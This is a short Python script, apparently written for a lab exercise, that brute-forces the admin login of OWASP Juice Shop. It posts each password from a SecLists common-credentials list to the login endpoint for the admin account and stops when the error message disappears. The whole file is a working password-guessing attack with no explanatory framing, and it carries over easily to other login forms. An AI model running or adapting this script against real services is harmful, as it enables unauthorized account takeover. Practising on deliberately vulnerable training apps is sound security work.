#!/usr/bin/env python3

#created to brute force the OWASP Juice Shop Login Page by @mr_y2kj
import requests

url = 'http://10.10.109.186/rest/user/login'

file="/opt/SecLists/Passwords/Common-Credentials/best1050.txt"

with open (file) as f:
	file_list=f.readlines()
	file_list = [line.strip() for line in file_list]
	for i in file_list:
			params = {'email':'admin@juice-sh.op','password':i}
			print(f'Trying admin@juice-sh.op:{i}')
			r = requests.post(url=url,data=params)
			if "Invalid email or password." not in r.text:
				print("PASSWORD FOUND!!")
				print(f"Password={i}")
				quit()
			print(r.text)
			print("\n")





